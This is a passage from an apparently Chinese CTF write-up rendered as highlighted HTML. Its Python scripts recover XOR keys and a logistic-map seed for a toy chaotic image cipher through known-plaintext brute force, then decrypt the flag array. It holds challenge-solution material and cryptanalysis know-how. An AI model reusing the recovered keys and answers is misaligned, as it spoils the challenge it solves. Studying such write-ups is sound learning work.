class="number">69</span>, <span class="number">106</span>, <span class="number">60</span>, <span class="number">21</span>, <span class="number">106</span>, <span class="number">236</span>, <span class="number">47</span>, <span class="number">145</span>, <span class="number">170</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">101</span>, <span class="number">14</span>, <span class="number">152</span>, <span class="number">131</span>, <span class="number">7</span>, <span class="number">37</span>, <span class="number">15</span>, <span class="number">168</span>, <span class="number">99</span>, <span class="number">115</span>, <span class="number">27</span>, <span class="number">220</span>, <span class="number">150</span>, <span class="number">89</span>, <span class="number">82</span>, <span class="number">232</span>, <span class="number">170</span>, <span class="number">107</span>, <span class="number">221</span>, <span class="number">212</span>, <span class="number">46</span>, <span class="number">235</span>, <span class="number">129</span>, <span class="number">36</span>, <span class="number">66</span>, <span class="number">217</span>, <span class="number">222</span>, <span class="number">36</span>, <span class="number">15</span>, <span class="number">217</span>, <span class="number">192</span>, <span class="number">247</span>, <span class="number">192</span>, <span class="number">113</span>, <span class="number">230</span>, <span class="number">129</span>, <span class="number">196</span>, <span class="number">13</span>, <span class="number">247</span>, <span class="number">148</span>, <span class="number">228</span>, <span class="number">225</span>, <span class="number">86</span>, <span class="number">71</span>, <span class="number">133</span>, <span class="number">132</span>, <span class="number">238</span>, <span class="number">236</span>, <span class="number">127</span>, <span class="number">11</span>, <span class="number">83</span>, <span class="number">107</span>, <span class="number">141</span>, <span class="number">114</span>, <span class="number">150</span>, <span class="number">182</span>, <span class="number">146</span>, <span class="number">213</span>, <span class="number">250</span>, <span class="number">141</span>, <span class="number">53</span>, <span class="number">114</span>, <span class="number">16</span>, <span class="number">198</span>, <span class="number">70</span>, <span class="number">133</span>, <span class="number">17</span>, <span class="number">247</span>, <span class="number">173</span>, <span class="number">136</span>, <span class="number">73</span>, <span class="number">236</span>, <span class="number">78</span>, <span class="number">188</span>, <span class="number">150</span>, <span class="number">239</span>, <span class="number">58</span>, <span class="number">199</span>, <span class="number">136</span>, <span class="number">11</span>, <span class="number">122</span>, <span class="number">134</span>, <span class="number">77</span>, <span class="number">47</span>, <span class="number">167</span>, <span class="number">137</span>, <span class="number">188</span>, <span class="number">55</span>, <span class="number">195</span>, <span class="number">41</span>, <span class="number">49</span>, <span class="number">245</span>, <span class="number">92</span>, <span class="number">160</span>, <span class="number">213</span>, <span class="number">254</span>, <span class="number">0</span>, <span class="number">85</span>, <span class="number">205</span>, <span class="number">193</span>, <span class="number">69</span>, <span class="number">2</span>, <span class="number">140</span>, <span class="number">143</span>, <span class="number">155</span>, <span class="number">127</span>, <span class="number">236</span>, <span class="number">179</span>, <span class="number">199</span>, <span class="number">168</span>, <span class="number">35</span>, <span class="number">85</span>, <span class="number">40</span>, <span class="number">45</span>, <span class="number">174</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> round(r*x*(<span class="number">3</span>-x),<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">key1 = []</span><br><span class="line">key2 = []</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(idx, off)</span>:</span></span><br><span class="line">    bin_x  = bin(idx)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">if</span> len(bin_x) &lt; <span class="number">16</span>:</span><br><span class="line">        bin_x = <span class="string">'0'</span>*(<span class="number">16</span>-len(bin_x))+bin_x</span><br><span class="line">    bins = <span class="string">""</span></span><br><span class="line">    bins += bin_x</span><br><span class="line">    <span class="comment"># print(bins)</span></span><br><span class="line">    <span class="keyword">for</span> index <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        ch = int(bins[<span class="number">2</span>*index:<span class="number">2</span>*index+<span class="number">2</span>],<span class="number">2</span>)</span><br><span class="line">        pix = testimage[index + <span class="number">8</span> * off]</span><br><span class="line">        cpix = test_enc[index + <span class="number">8</span> * off]</span><br><span class="line">        <span class="keyword">if</span> ch == <span class="number">0</span>:</span><br><span class="line">            keyy = (pix ^ cpix)&amp;<span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> keyy <span class="keyword">not</span> <span class="keyword">in</span> key1:</span><br><span class="line">                key1.append(keyy)</span><br><span class="line">        <span class="keyword">if</span> ch == <span class="number">1</span>:</span><br><span class="line">            keyy = (~pix ^ cpix)&amp;<span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> keyy <span class="keyword">not</span> <span class="keyword">in</span> key1:</span><br><span class="line">                key1.append(keyy)</span><br><span class="line">        <span class="keyword">if</span> ch == <span class="number">2</span>:</span><br><span class="line">            keyy = (pix ^ cpix)&amp;<span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> keyy <span class="keyword">not</span> <span class="keyword">in</span> key2:</span><br><span class="line">                key2.append(keyy)</span><br><span class="line">        <span class="keyword">if</span> ch == <span class="number">3</span>:</span><br><span class="line">            keyy = (~pix ^ cpix)&amp;<span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> keyy <span class="keyword">not</span> <span class="keyword">in</span> key2:</span><br><span class="line">                key2.append(keyy)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    keys = []</span><br><span class="line">    dic = dict()</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>**<span class="number">16</span>):</span><br><span class="line">            key1 = []</span><br><span class="line">            key2 = []</span><br><span class="line">            decrypt(i, j)</span><br><span class="line">            <span class="keyword">if</span> len(key1) == len(key2) <span class="keyword">and</span> len(key1) == <span class="number">1</span>:</span><br><span class="line">                <span class="comment"># if (key1[0], key2[0]) == (169, 78):</span></span><br><span class="line">                <span class="keyword">if</span> (len(key1) == len(key2)) <span class="keyword">and</span> (len(key1) == <span class="number">1</span>):</span><br><span class="line">                    x = (key1[<span class="number">0</span>], key2[<span class="number">0</span>])</span><br><span class="line">                    <span class="comment"># print(x)</span></span><br><span class="line">                    <span class="keyword">if</span> x <span class="keyword">in</span> dic:</span><br><span class="line">                        dic[x].append((i, j))</span><br><span class="line">                    <span class="keyword">else</span> :</span><br><span class="line">                        dic[x] = [(i, j)]</span><br><span class="line">    <span class="comment"># print(dic)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic: </span><br><span class="line">        r_lis = []</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">30</span>):    </span><br><span class="line">            a = dic[i][j][<span class="number">0</span>] / <span class="number">22000</span></span><br><span class="line">            b = dic[i][j + <span class="number">1</span>][<span class="number">0</span>] / <span class="number">22000</span></span><br><span class="line">            <span class="comment"># print(a, b)</span></span><br><span class="line">            r_lis.append(round(b / (a * (<span class="number">3</span> - a)), <span class="number">6</span>))</span><br><span class="line">        print(r_lis, i)</span><br><span class="line">            </span><br><span class="line">    <span class="comment"># r = 1.2</span></span><br><span class="line">    <span class="comment"># key1 = 169</span></span><br><span class="line">    <span class="comment"># key2 = 78</span></span><br><span class="line">    lis = [<span class="number">47909</span>, <span class="number">47275</span>, <span class="number">48284</span>, <span class="number">46656</span>, <span class="number">49226</span>, <span class="number">51495</span>, <span class="number">40740</span>, <span class="number">56131</span>, <span class="number">30213</span>, <span class="number">58976</span>, <span class="number">22593</span>, <span class="number">53493</span>, <span class="number">36492</span>, <span class="number">58734</span>, <span class="number">23276</span>, <span class="number">54242</span>, <span class="number">34786</span>, <span class="number">59225</span>, <span class="number">21883</span>, <span class="number">52659</span>, <span class="number">38317</span>, <span class="number">57857</span>, <span class="number">25696</span>, <span class="number">56490</span>, <span class="number">29302</span>, <span class="number">58654</span>, <span class="number">23501</span>, <span class="number">54478</span>, <span class="number">34236</span>, <span class="number">59316</span>, <span class="number">21623</span>]</span><br><span class="line">    xl = round(<span class="number">47909</span> / <span class="number">22000</span>, <span class="number">6</span>) * <span class="number">1000000</span></span><br><span class="line">    xr = round(<span class="number">47910</span> / <span class="number">22000</span>, <span class="number">6</span>) * <span class="number">1000000</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(int(xl), int(xr)):</span><br><span class="line">        x = i/<span class="number">1000000</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">31</span>):</span><br><span class="line">            x = generate(x)</span><br><span class="line">            tmp = int(x * <span class="number">22000</span>)</span><br><span class="line">            <span class="keyword">if</span> tmp <span class="keyword">not</span> <span class="keyword">in</span> lis:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> tmp == <span class="number">49226</span>:</span><br><span class="line">                x = generate(x)</span><br><span class="line">            <span class="keyword">if</span> tmp == lis[<span class="number">-1</span>]:</span><br><span class="line">                print(i)</span><br><span class="line">    <span class="comment"># x = 2.177698</span></span><br></pre></td></tr></table></figure>
+<p>然后求解flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python2</span></span><br><span class="line"><span class="keyword">import</span> md5</span><br><span class="line">r = <span class="number">1.2</span></span><br><span class="line">x0 = <span class="number">2.177698</span> </span><br><span class="line">key1 = <span class="number">169</span></span><br><span class="line">key2 = <span class="number">78</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> round(r*x*(<span class="number">3</span>-x),<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(pixel,key1,key2,x0,m,n)</span>:</span></span><br><span class="line">    num = m*n//<span class="number">8</span>    </span><br><span class="line">    seqs = []</span><br><span class="line">    x = x0</span><br><span class="line">    bins = <span class="string">''</span></span><br><span class="line">    tmp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(num):</span><br><span class="line">        <span class="keyword">if</span> i &gt; <span class="number">0</span>:  </span><br><span class="line">            x = generate(x)</span><br><span class="line">        tmp.append(x)</span><br><span class="line">        seqs.append(int(x*<span class="number">22000</span>))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> seqs:</span><br><span class="line">        bin_x  = bin(x)[<span class="number">2</span>:]</span><br><span class="line">        <span class="keyword">if</span> len(bin_x) &lt; <span class="number">16</span>:</span><br><span class="line">            bin_x = <span class="string">'0'</span>*(<span class="number">16</span>-len(bin_x))+bin_x</span><br><span class="line">        bins += bin_x</span><br><span class="line">    <span class="keyword">assert</span>(len(pixel) == m*n)</span><br><span class="line">    cipher = [ <span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(m) <span class="keyword">for</span> j <span class="keyword">in</span> range(n)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(m):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(n):</span><br><span class="line">            index = n*i+j</span><br><span class="line">            ch = int(bins[<span class="number">2</span>*index:<span class="number">2</span>*index+<span class="number">2</span>],<span class="number">2</span>)</span><br><span class="line">            pix = pixel[index]</span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">0</span>:</span><br><span class="line">                pix = (pix^key1)&amp;<span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">1</span>:</span><br><span class="line">                pix = (~(pix^key1))&amp;<span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">2</span>:</span><br><span class="line">                pix = (pix^key2)&amp;<span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">3</span>:</span><br><span class="line">                pix = (~(pix^key2))&amp;<span class="number">0xff</span></span><br><span class="line">            cipher[index] = pix </span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line">testimage = [<span class="number">205</span>, <span class="number">237</span>, <span class="number">6</span>, <span class="number">158</span>, <span class="number">24</span>, <span class="number">119</span>, <span class="number">213</span>, <span class="number">32</span>, <span class="number">74</span>, <span class="number">151</span>, <span class="number">142</span>, <span class="number">186</span>, <span class="number">57</span>, <span class="number">28</span>, <span class="number">113</span>, <span class="number">62</span>, <span class="number">165</span>, <span class="number">20</span>, <span class="number">190</span>, <span class="number">37</span>, <span class="number">159</span>, <span class="number">137</span>, <span class="number">196</span>, <span class="number">44</span>, <span class="number">97</span>, <span class="number">37</span>, <span class="number">7</span>, <span class="number">222</span>, <span class="number">220</span>, <span class="number">95</span>, <span class="number">4</span>, <span class="number">66</span>, <span class="number">0</span>, <span class="number">28</span>, <span class="number">199</span>, <span class="number">142</span>, <span class="number">95</span>, <span class="number">105</span>, <span class="number">119</span>, <span class="number">232</span>, <span class="number">250</span>, <span class="number">215</span>, <span class="number">60</span>, <span class="number">162</span>, <span class="number">91</span>, <span class="number">211</span>, <span class="number">63</span>, <span class="number">30</span>, <span class="number">91</span>, <span class="number">108</span>, <span class="number">217</span>, <span class="number">206</span>, <span class="number">80</span>, <span class="number">193</span>, <span class="number">230</span>, <span class="number">42</span>, <span class="number">221</span>, <span class="number">71</span>, <span class="number">136</span>, <span class="number">115</span>, <span class="number">22</span>, <span class="number">176</span>, <span class="number">91</span>, <span class="number">57</span>, <span class="number">61</span>, <span class="number">3</span>, <span class="number">87</span>, <span class="number">73</span>, <span class="number">250</span>, <span class="number">121</span>, <span class="number">51</span>, <span class="number">72</span>, <span class="number">83</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">199</span>, <span class="number">236</span>, <span class="number">190</span>, <span class="number">249</span>, <span class="number">116</span>, <span class="number">45</span>, <span class="number">6</span>, <span class="number">134</span>, <span class="number">110</span>, <span class="number">149</span>, <span class="number">94</span>, <span class="number">214</span>, <span class="number">232</span>, <span class="number">153</span>, <span class="number">213</span>, <span class="number">119</span>, <span class="number">98</span>, <span class="number">81</span>, <span class="number">203</span>, <span class="number">240</span>, <span class="number">114</span>, <span class="number">240</span>, <span class="number">29</span>, <span class="number">122</span>, <span class="number">188</span>, <span class="number">156</span>, <span class="number">53</span>, <span class="number">128</span>, <span class="number">185</span>, <span class="number">40</span>, <span class="number">147</span>, <span class="number">245</span>, <span class="number">204</span>, <span class="number">47</span>, <span class="number">101</span>, <span class="number">80</span>, <span class="number">229</span>, <span class="number">41</span>, <span class="number">150</span>, <span class="number">28</span>, <span class="number">195</span>, <span class="number">25</span>, <span class="number">235</span>, <span class="number">119</span>, <span class="number">6</span>, <span class="number">192</span>, <span class="number">8</span>, <span class="number">73</span>, <span class="number">255</span>, <span class="number">159</span>, <span class="number">172</span>, <span class="number">77</span>, <span class="number">94</span>, <span class="number">254</span>, <span class="number">104</span>, <span class="number">236</span>, <span class="number">219</span>, <span class="number">141</span>, <span class="number">91</span>, <span class="number">195</span>, <span class="number">162</span>, <span class="number">97</span>, <span class="number">56</span>, <span class="number">252</span>, <span class="number">173</span>, <span class="number">163</span>, <span class="number">43</span>, <span class="number">167</span>, <span class="number">214</span>, <span class="number">50</span>, <span class="number">73</span>, <span class="number">115</span>, <span class="number">190</span>, <span class="number">254</span>, <span class="number">53</span>, <span class="number">61</span>, <span class="number">77</span>, <span class="number">138</span>, <span class="number">192</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">190</span>, <span class="number">27</span>, <span class="number">37</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">135</span>, <span class="number">90</span>, <span class="number">215</span>, <span class="number">106</span>, <span class="number">243</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">106</span>, <span class="number">89</span>, <span class="number">143</span>, <span class="number">150</span>, <span class="number">185</span>, <span class="number">142</span>, <span class="number">192</span>, <span class="number">176</span>, <span class="number">48</span>, <span class="number">138</span>, <span class="number">164</span>, <span class="number">185</span>, <span class="number">61</span>, <span class="number">77</span>, <span class="number">72</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">203</span>, <span class="number">210</span>, <span class="number">71</span>, <span class="number">186</span>, <span class="number">49</span>, <span class="number">162</span>, <span class="number">250</span>, <span class="number">218</span>, <span class="number">219</span>, <span class="number">195</span>, <span class="number">63</span>, <span class="number">248</span>, <span class="number">220</span>, <span class="number">155</span>, <span class="number">180</span>, <span class="number">219</span>, <span class="number">132</span>, <span class="number">219</span>, <span class="number">94</span>, <span class="number">144</span>, <span class="number">247</span>, <span class="number">211</span>, <span class="number">95</span>, <span class="number">70</span>, <span class="number">227</span>, <span class="number">222</span>, <span class="number">31</span>, <span class="number">69</span>, <span class="number">24</span>, <span class="number">13</span>, <span class="number">216</span>, <span class="number">185</span>, <span class="number">108</span>, <span class="number">137</span>, <span class="number">57</span>, <span class="number">186</span>, <span class="number">211</span>, <span class="number">55</span>, <span class="number">27</span>, <span class="number">158</span>, <span class="number">241</span>, <span class="number">223</span>, <span class="number">21</span>, <span class="number">134</span>, <span class="number">106</span>, <span class="number">152</span>, <span class="number">127</span>, <span class="number">187</span>, <span class="number">245</span>, <span class="number">246</span>, <span class="number">131</span>, <span class="number">176</span>, <span class="number">177</span>, <span class="number">228</span>, <span class="number">100</span>, <span class="number">112</span>, <span class="number">11</span>, <span class="number">84</span>, <span class="number">61</span>, <span class="number">193</span>, <span class="number">42</span>, <span class="number">41</span>, <span class="number">69</span>, <span class="number">229</span>, <span class="number">145</span>, <span class="number">254</span>, <span class="number">138</span>, <span class="number">3</span>, <span class="number">153</span>, <span class="number">123</span>, <span class="number">31</span>]</span><br><span class="line">test_enc = [<span class="number">131</span>, <span class="number">92</span>, <span class="number">72</span>, <span class="number">47</span>, <span class="number">177</span>, <span class="number">57</span>, <span class="number">131</span>, <span class="number">118</span>, <span class="number">4</span>, <span class="number">38</span>, <span class="number">192</span>, <span class="number">19</span>, <span class="number">119</span>, <span class="number">82</span>, <span class="number">63</span>, <span class="number">143</span>, <span class="number">235</span>, <span class="number">165</span>, <span class="number">15</span>, <span class="number">140</span>, <span class="number">209</span>, <span class="number">223</span>, <span class="number">117</span>, <span class="number">133</span>, <span class="number">47</span>, <span class="number">148</span>, <span class="number">81</span>, <span class="number">144</span>, <span class="number">138</span>, <span class="number">246</span>, <span class="number">173</span>, <span class="number">235</span>, <span class="number">177</span>, <span class="number">181</span>, <span class="number">110</span>, <span class="number">39</span>, <span class="number">9</span>, <span class="number">192</span>, <span class="number">57</span>, <span class="number">166</span>, <span class="number">180</span>, <span class="number">153</span>, <span class="number">141</span>, <span class="number">19</span>, <span class="number">234</span>, <span class="number">157</span>, <span class="number">142</span>, <span class="number">80</span>, <span class="number">234</span>, <span class="number">197</span>, <span class="number">151</span>, <span class="number">152</span>, <span class="number">249</span>, <span class="number">143</span>, <span class="number">176</span>, <span class="number">155</span>, <span class="number">147</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">194</span>, <span class="number">191</span>, <span class="number">254</span>, <span class="number">13</span>, <span class="number">144</span>, <span class="number">140</span>, <span class="number">85</span>, <span class="number">25</span>, <span class="number">248</span>, <span class="number">172</span>, <span class="number">208</span>, <span class="number">154</span>, <span class="number">249</span>, <span class="number">5</span>, <span class="number">201</span>, <span class="number">27</span>, <span class="number">137</span>, <span class="number">69</span>, <span class="number">23</span>, <span class="number">175</span>, <span class="number">34</span>, <span class="number">156</span>, <span class="number">72</span>, <span class="number">208</span>, <span class="number">32</span>, <span class="number">195</span>, <span class="number">16</span>, <span class="number">127</span>, <span class="number">65</span>, <span class="number">207</span>, <span class="number">131</span>, <span class="number">57</span>, <span class="number">203</span>, <span class="number">7</span>, <span class="number">98</span>, <span class="number">89</span>, <span class="number">36</span>, <span class="number">65</span>, <span class="number">75</span>, <span class="number">211</span>, <span class="number">21</span>, <span class="number">45</span>, <span class="number">132</span>, <span class="number">214</span>, <span class="number">239</span>, <span class="number">102</span>, <span class="number">58</span>, <span class="number">68</span>, <span class="number">130</span>, <span class="number">97</span>, <span class="number">204</span>, <span class="number">225</span>, <span class="number">76</span>, <span class="number">152</span>, <span class="number">216</span>, <span class="number">74</span>, <span class="number">149</span>, <span class="number">79</span>, <span class="number">165</span>, <span class="number">198</span>, <span class="number">72</span>, <span class="number">150</span>, <span class="number">94</span>, <span class="number">7</span>, <span class="number">177</span>, <span class="number">46</span>, <span class="number">226</span>, <span class="number">252</span>, <span class="number">247</span>, <span class="number">79</span>, <span class="number">62</span>, <span class="number">69</span>, <span class="number">106</span>, <span class="number">60</span>, <span class="number">21</span>, <span class="number">106</span>, <span class="number">236</span>, <span class="number">47</span>, <span class="number">145</span>, <span class="number">170</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">101</span>, <span class="number">14</span>, <span class="number">152</span>, <span class="number">131</span>, <span class="number">7</span>, <span class="number">37</span>, <span class="number">15</span>, <span class="number">168</span>, <span class="number">99</span>, <span class="number">115</span>, <span class="number">27</span>, <span class="number">220</span>, <span class="number">150</span>, <span class="number">89</span>, <span class="number">82</span>, <span class="number">232</span>, <span class="number">170</span>, <span class="number">107</span>, <span class="number">221</span>, <span class="number">212</span>, <span class="number">46</span>, <span class="number">235</span>, <span class="number">129</span>, <span class="number">36</span>, <span class="number">66</span>, <span class="number">217</span>, <span class="number">222</span>, <span class="number">36</span>, <span class="number">15</span>, <span class="number">217</span>, <span class="number">192</span>, <span class="number">247</span>, <span class="number">192</span>, <span class="number">113</span>, <span class="number">230</span>, <span class="number">129</span>, <span class="number">196</span>, <span class="number">13</span>, <span class="number">247</span>, <span class="number">148</span>, <span class="number">228</span>, <span class="number">225</span>, <span class="number">86</span>, <span class="number">71</span>, <span class="number">133</span>, <span class="number">132</span>, <span class="number">238</span>, <span class="number">236</span>, <span class="number">127</span>, <span class="number">11</span>, <span class="number">83</span>, <span class="number">107</span>, <span class="number">141</span>, <span class="number">114</span>, <span class="number">150</span>, <span class="number">182</span>, <span class="number">146</span>, <span class="number">213</span>, <span class="number">250</span>, <span class="number">141</span>, <span class="number">53</span>, <span class="number">114</span>, <span class="number">16</span>, <span class="number">198</span>, <span class="number">70</span>, <span class="number">133</span>, <span class="number">17</span>, <span class="number">247</span>, <span class="number">173</span>, <span class="number">136</span>, <span class="number">73</span>, <span class="number">236</span>, <span class="number">78</span>, <span class="number">188</span>, <span class="number">150</span>, <span class="number">239</span>, <span class="number">58</span>, <span class="number">199</span>, <span class="number">136</span>, <span class="number">11</span>, <span class="number">122</span>, <span class="number">134</span>, <span class="number">77</span>, <span class="number">47</span>, <span class="number">167</span>, <span class="number">137</span>, <span class="number">188</span>, <span class="number">55</span>, <span class="number">195</span>, <span class="number">41</span>, <span class="number">49</span>, <span class="number">245</span>, <span class="number">92</span>, <span class="number">160</span>, <span class="number">213</span>, <span class="number">254</span>, <span class="number">0</span>, <span class="number">85</span>, <span class="number">205</span>, <span class="number">193</span>, <span class="number">69</span>, <span class="number">2</span>, <span class="number">140</span>, <span class="number">143</span>, <span class="number">155</span>, <span class="number">127</span>, <span class="number">236</span>, <span class="number">179</span>, <span class="number">199</span>, <span class="number">168</span>, <span class="number">35</span>, <span class="number">85</span>, <span class="number">40</span>, <span class="number">45</span>, <span class="number">174</span>]</span><br><span class="line">flag_enc = [<span class="number">198</span>, <span class="number">143</span>, <span class="number">247</span>, <span class="number">3</span>, <span class="number">152</span>, <span class="number">139</span>, <span class="number">131</span>, <span class="number">84</span>, <span class="number">181</span>, <span class="number">180</span>, <span class="number">252</span>, <span class="number">177</span>, <span class="number">192</span>, <span class="number">25</span>, <span class="number">217</span>, <span class="number">179</span>, <span class="number">136</span>, <span class="number">107</span>, <span class="number">190</span>, <span class="number">62</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">90</span>, <span class="number">53</span>, <span class="number">105</span>, <span class="number">238</span>, <span class="number">117</span>, <span class="number">44</span>, <span class="number">5</span>, <span class="number">116</span>, <span class="number">132</span>, <span class="number">195</span>, <span class="number">214</span>, <span class="number">171</span>, <span class="number">113</span>, <span class="number">209</span>, <span class="number">18</span>, <span class="number">31</span>, <span class="number">194</span>, <span class="number">174</span>, <span class="number">228</span>, <span class="number">212</span>, <span class="number">196</span>, <span class="number">14</span>, <span class="number">27</span>, <span class="number">41</span>, <span class="number">211</span>, <span class="number">56</span>, <span class="number">139</span>, <span class="number">135</span>, <span class="number">225</span>, <span class="number">214</span>, <span class="number">89</span>, <span class="number">122</span>, <span class="number">178</span>, <span class="number">212</span>, <span class="number">185</span>, <span class="number">231</span>, <span class="number">204</span>, <span class="number">150</span>, <span class="number">204</span>, <span class="number">212</span>, <span class="number">160</span>, <span class="number">142</span>, <span class="number">213</span>, <span class="number">173</span>, <span class="number">186</span>, <span class="number">166</span>, <span class="number">65</span>, <span class="number">238</span>, <span class="number">5</span>, <span class="number">32</span>, <span class="number">45</span>, <span class="number">31</span>, <span class="number">25</span>, <span class="number">189</span>, <span class="number">148</span>, <span class="number">38</span>, <span class="number">78</span>, <span class="number">79</span>, <span class="number">33</span>, <span class="number">56</span>, <span class="number">227</span>, <span class="number">48</span>, <span class="number">103</span>, <span class="number">163</span>, <span class="number">31</span>, <span class="number">189</span>, <span class="number">37</span>, <span class="number">124</span>, <span class="number">106</span>, <span class="number">249</span>, <span class="number">86</span>, <span class="number">188</span>, <span class="number">86</span>, <span class="number">233</span>, <span class="number">41</span>, <span class="number">250</span>, <span class="number">89</span>, <span class="number">7</span>, <span class="number">212</span>, <span class="number">234</span>, <span class="number">111</span>, <span class="number">104</span>, <span class="number">245</span>, <span class="number">102</span>, <span class="number">227</span>, <span class="number">96</span>, <span class="number">160</span>, <span class="number">67</span>, <span class="number">181</span>, <span class="number">13</span>, <span class="number">26</span>, <span class="number">192</span>, <span class="number">214</span>, <span class="number">210</span>, <span class="number">188</span>, <span class="number">84</span>, <span class="number">216</span>, <span class="number">215</span>, <span class="number">243</span>, <span class="number">72</span>, <span class="number">233</span>, <span class="number">2</span>, <span class="number">122</span>, <span class="number">166</span>, <span class="number">107</span>, <span class="number">251</span>, <span class="number">70</span>, <span class="number">128</span>, <span class="number">94</span>, <span class="number">190</span>, <span class="number">185</span>, <span class="number">210</span>, <span class="number">34</span>, <span class="number">85</span>, <span class="number">77</span>, <span class="number">29</span>, <span class="number">182</span>, <span class="number">77</span>, <span class="number">115</span>, <span class="number">208</span>, <span class="number">228</span>, <span class="number">252</span>, <span class="number">73</span>, <span class="number">198</span>, <span class="number">151</span>, <span class="number">70</span>, <span class="number">10</span>, <span class="number">97</span>, <span class="number">138</span>, <span class="number">235</span>, <span class="number">21</span>, <span class="number">117</span>, <span class="number">239</span>, <span class="number">102</span>, <span class="number">129</span>, <span class="number">2</span>, <span class="number">253</span>, <span class="number">80</span>, <span class="number">53</span>, <span class="number">61</span>, <span class="number">184</span>, <span class="number">220</span>, <span class="number">41</span>, <span class="number">82</span>, <span class="number">37</span>, <span class="number">140</span>, <span class="number">23</span>, <span class="number">143</span>, <span class="number">179</span>, <span class="number">53</span>, <span class="number">153</span>, <span class="number">113</span>, <span class="number">213</span>, <span class="number">211</span>, <span class="number">111</span>, <span class="number">197</span>, <span class="number">248</span>, <span class="number">65</span>, <span class="number">60</span>, <span class="number">69</span>, <span class="number">1</span>, <span class="number">81</span>, <span class="number">48</span>, <span class="number">254</span>, <span class="number">251</span>, <span class="number">89</span>, <span class="number">195</span>, <span class="number">8</span>, <span class="number">93</span>, <span class="number">190</span>, <span class="number">66</span>, <span class="number">174</span>, <span class="number">97</span>, <span class="number">175</span>, <span class="number">210</span>, <span class="number">191</span>, <span class="number">66</span>, <span class="number">112</span>, <span class="number">123</span>, <span class="number">128</span>, <span class="number">33</span>, <span class="number">230</span>, <span class="number">237</span>, <span class="number">104</span>, <span class="number">16</span>, <span class="number">192</span>, <span class="number">239</span>, <span class="number">173</span>, <span class="number">44</span>, <span class="number">10</span>, <span class="number">120</span>, <span class="number">231</span>, <span class="number">114</span>, <span class="number">151</span>, <span class="number">140</span>, <span class="number">63</span>, <span class="number">103</span>, <span class="number">44</span>, <span class="number">243</span>, <span class="number">222</span>, <span class="number">242</span>, <span class="number">73</span>, <span class="number">51</span>, <span class="number">46</span>, <span class="number">98</span>, <span class="number">137</span>, <span class="number">163</span>, <span class="number">152</span>, <span class="number">147</span>, <span class="number">95</span>, <span class="number">223</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">112</span>, <span class="number">85</span>, <span class="number">215</span>, <span class="number">133</span>, <span class="number">131</span>, <span class="number">240</span>, <span class="number">239</span>, <span 